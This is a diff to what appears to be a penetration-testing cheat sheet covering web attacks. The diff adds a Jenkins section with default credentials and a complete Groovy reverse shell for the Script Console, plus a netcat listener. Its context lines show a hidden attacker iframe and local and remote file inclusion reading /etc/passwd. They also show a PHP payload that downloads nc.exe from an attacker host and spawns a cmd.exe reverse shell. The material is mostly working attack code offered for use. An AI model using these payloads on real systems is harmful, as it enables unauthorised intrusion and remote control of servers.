@@ -174,6 +174,28 @@ for i in `cat ssl.txt` ; do curl -ikL -X OPTIONS https://$i/ > $i 2>&1 ; echo Sc
 <iframe src="http://<attacker IP>" width="1" height="1"></iframe>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# Jenkins
+
+An open-source automation server that helps automate the parts of software development related to building, testing, and deploying, facilitating
+continuous integration, and delivery. It is a server-based system.
+
+root:password
+
+https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution
+https://github.com/gquere/pwn_jenkins
+
+- Locate the Script Console (IP/script) and paste in the following reverse shell:
+String host="<attacker IP>";
+int port=8000;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+- Setup a nc listener.
+nc -lvnp 8000
+
+- Server > Run
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Local File Inclusion
 
 http://target.com/test.php?page=/etc/passwd
@@ -210,9 +232,16 @@ http://target.com/test.php?page=http://<attacker IP>/test.txt
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# Server-side Template Injection
+
+Test with: {{5*5}}
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # SQL Injection
 
-Seee databases.txt
+See databases.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # URL Encoding
